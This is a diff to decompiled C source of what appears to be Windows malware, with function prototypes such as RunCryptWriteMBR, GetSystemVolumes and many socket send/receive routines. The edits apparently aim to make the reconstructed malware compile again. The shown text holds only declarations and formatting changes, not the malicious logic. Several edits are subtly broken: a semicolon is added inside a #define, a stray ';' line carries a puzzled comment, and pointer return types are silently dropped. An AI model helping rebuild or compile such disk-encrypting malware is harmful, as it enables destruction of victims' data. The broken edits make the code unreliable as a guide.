@@ -6,7 +6,7 @@ Detected compiler: Visual C++
 */
 
 #include <windows.h>
-#include <defs.h>
+#include "defs.h"
 #include "Header.h"
 #include "ExtFiles.h"
 
@@ -14,14 +14,15 @@ Detected compiler: Visual C++
 //-------------------------------------------------------------------------
 // Function declarations
 
-#define __thiscall __cdecl // Test compile in C mode
+#define __thiscall __cdecl ; // Test compile in C mode
 
-LPVOID __stdcall CreateHeap(SIZE_T dwBytes);
+;// Why does the IDE think this semicolin needs to be here?
 void __stdcall FreeHeap(LPVOID lpMem);
+LPVOID __stdcall CreateHeap_remove(SIZE_T dwBytes);
 int __stdcall GetSystemVolumes(void *); // idb
 int __stdcall CreateSomeFiles(LPCSTR lpFileName, int); // idb
 int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst); // idb
-															 // int __userpurge CheckIfFileExists@<eax>(int a1@<eax>, LPCSTR lpFileName, LPCVOID lpBuffer);
+// int __userpurge CheckIfFileExists@<eax>(int a1@<eax>, LPCSTR lpFileName, LPCVOID lpBuffer);
 int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen); // idb
 int RunCryptWriteMBR();
 HANDLE __stdcall WriteFileMapping(LPCWSTR lpFileName, int a2);
@@ -49,9 +50,9 @@ _BYTE *__stdcall Unk_ReturnByteArrayOfUnk_Exe(__int16 a1, __int16 a2, __int16 a3
 // _WORD *__userpurge sub_681F28B5@<eax>(char a1@<al>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, BOOL a6, void *Src, _WORD *a8);
 // _BYTE *__userpurge sub_681F29CE@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5);
 // char *__userpurge sub_681F2ADF@<eax>(_WORD *a1@<eax>, __int16 a2@<dx>, __int16 a3@<cx>, char a4, char a5);
-char *__fastcall sub_681F2C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src);
-char *__thiscall sub_681F2CCF(void *this, int a2, int a3, void *Src, int a5);
-_WORD *__thiscall sub_681F2D82(void *this, char a2);
+char  sub_681F2C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src);
+char  sub_681F2CCF(void *this, int a2, int a3, void *Src, int a5);
+_WORD  sub_681F2D82(void *this, char a2);
 // char *__userpurge sub_681F2E30@<eax>(_WORD *a1@<ebx>, unsigned __int16 a2@<di>, char a3, __int16 a4, void *Src);
 // signed int __userpurge SockSendRecvDataFreeHeap@<eax>(SOCKET a1@<eax>, __int16 a2, LPVOID a3, int a4, _WORD *a5);
 // signed int __userpurge SockProcessSendRecv_2@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5, LPVOID a6, char *a7, int a8, void *a9, _DWORD *a10, _WORD *a11);
@@ -60,34 +61,34 @@ int __stdcall SocketUseSocket1(SOCKET s, int, int, int, int, int); // idb
 int __stdcall SocketUseSocket2(SOCKET s, int, int, int, int, int); // idb
 int __stdcall sub_681F330E(SOCKET s, int, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
 int __stdcall sub_681F3469(SOCKET s, int, int, int, int, int, void *, void *Src, int); // idb
-																					   // signed int __userpurge sub_681F35FA@<eax>(SOCKET a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11);
-																					   // signed int __userpurge sub_681F369D@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6);
+// signed int __userpurge sub_681F35FA@<eax>(SOCKET a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11);
+// signed int __userpurge sub_681F369D@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6);
 int __stdcall SockProcessSendRecv(SOCKET s, int, int, int, int, int, int, void *Src); // idb
-																					  // int __userpurge sub_681F3863@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src);
-																					  // int __userpurge sub_681F3986@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13);
+// int __userpurge sub_681F3863@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src);
+// int __userpurge sub_681F3986@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13);
 int __stdcall sub_681F3B5D(SOCKET s, int, int, int, int, int); // idb
 int __stdcall sub_681F3C0A(SOCKET s, int, int, int, int, int); // idb
-															   // signed int __userpurge sub_681F3CA0@<eax>(char a1@<al>, SOCKET a2);
+// signed int __userpurge sub_681F3CA0@<eax>(char a1@<al>, SOCKET a2);
 int __stdcall CreateAndGetHeap(SOCKET s, int, int, int, int, int, int, int, int, int, int, int); // idb
-																								 // int __userpurge SocketProcessSocket_1@<eax>(char *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8);
-																								 // int __userpurge SocketProcessSocket_2@<eax>(_WORD *a1@<edi>, SOCKET s, int a3, int a4, int a5, int a6, int a7);
+// int __userpurge SocketProcessSocket_1@<eax>(char *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8);
+// int __userpurge SocketProcessSocket_2@<eax>(_WORD *a1@<edi>, SOCKET s, int a3, int a4, int a5, int a6, int a7);
 int __stdcall sub_681F42DF(SOCKET s, int, int, int, int, int, int); // idb
-																	// signed int __userpurge sub_681F4820@<eax>(void *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
-																	// int __userpurge sub_681F489C@<eax>(_WORD *a1@<eax>, _WORD *a2@<ecx>, SOCKET s, int a4, int a5, int a6, __int16 a7);
+// signed int __userpurge sub_681F4820@<eax>(void *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
+// int __userpurge sub_681F489C@<eax>(_WORD *a1@<eax>, _WORD *a2@<ecx>, SOCKET s, int a4, int a5, int a6, __int16 a7);
 int __stdcall sub_681F4AFE(SOCKET s, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
 int __stdcall sub_681F4BA1(SOCKET s, int, int, int, int, int); // idb
-															   // signed int __userpurge sub_681F4C1C@<eax>(int a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12);
-															   // signed int __userpurge sub_681F4FB3@<eax>(int a1@<edx>, int a2@<esi>, __int64 a3);
-															   // signed int __userpurge sub_681F501B@<eax>(int a1@<eax>, int a2@<ecx>, __int64 a3);
+// signed int __userpurge sub_681F4C1C@<eax>(int a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12);
+// signed int __userpurge sub_681F4FB3@<eax>(int a1@<edx>, int a2@<esi>, __int64 a3);
+// signed int __userpurge sub_681F501B@<eax>(int a1@<eax>, int a2@<ecx>, __int64 a3);
 signed int __stdcall sub_681F50E0(SOCKET a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, unsigned __int16 a8);
 // signed int __userpurge sub_681F51F3@<eax>(int a1@<edi>, SOCKET a2, int a3, int a4, int a5, int a6);
 // signed int __userpurge sub_681F5333@<eax>(int a1@<ebx>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *Src);
 int __stdcall SocketUseSockets(int, SOCKET s, int, int, int, int, int); // idb
-																		// int __userpurge sub_681F5A7E@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
-																		// int __userpurge sub_681F668A@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *cp, int a4, int a5, int a6, int a7, int a8, int a9);
-																		// int __userpurge SocketCreateAndConnect@<eax>(unsigned __int8 *a1@<ebx>, int a2, char *cp, u_short hostshort);
-																		// int __userpurge SockGetData@<eax>(char **a1@<ebx>, __int16 *a2@<esi>, SOCKET s, char a4, int a5);
-																		// int __userpurge SockSendBuffer@<eax>(SOCKET a1@<ebx>, char *buf, int len);
+// int __userpurge sub_681F5A7E@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
+// int __userpurge sub_681F668A@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *cp, int a4, int a5, int a6, int a7, int a8, int a9);
+// int __userpurge SocketCreateAndConnect@<eax>(unsigned __int8 *a1@<ebx>, int a2, char *cp, u_short hostshort);
+// int __userpurge SockGetData@<eax>(char **a1@<ebx>, __int16 *a2@<esi>, SOCKET s, char a4, int a5);
+// int __userpurge SockSendBuffer@<eax>(SOCKET a1@<ebx>, char *buf, int len);
 int __stdcall ConvertHeapMToWBytes(LPCSTR lpMultiByteStr); // idb
 int ReturnTimeIfTimePassed();
 // signed int __usercall CheckUsrArgs@<eax>(int a1@<eax>);
@@ -6197,7 +6198,7 @@ _UNKNOWN loc_68206A51; // weak
 _UNKNOWN unk_68207090; // weak
 //_UNKNOWN SomeExe2; // weak
 _UNKNOWN unk_68208AD0; // weak
-char aVVVVVVVVvv[18] = "¢À¢Ð¢Í¢Õ¢Ñ¢Ç¢Ð¢¢¢"; // weak
+char aVVVVVVVVvv[18] = "¢À¢Ð¢Í¢Õ¢Ñ¢Ç¢Ð¢¢¢"; // weak // 
 _UNKNOWN unk_68208B48; // weak
 char aUUUdugufuUdugu[46] = "u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%u6uQuuuJJJJJu"; // weak
 char aVVVVVVVvv[16] = "¢Î¢Ñ¢Ã¢Ð¢Ò¢Á¢¢¢"; // weak
@@ -6256,7 +6257,7 @@ int dword_6820FB48; // weak
 
 
 					//----- (681F1000) --------------------------------------------------------
-LPVOID __stdcall CreateHeap(SIZE_T dwBytes)
+LPVOID __stdcall CreateHeap_remove(SIZE_T dwBytes)
 {
 	HANDLE v1; // eax
 
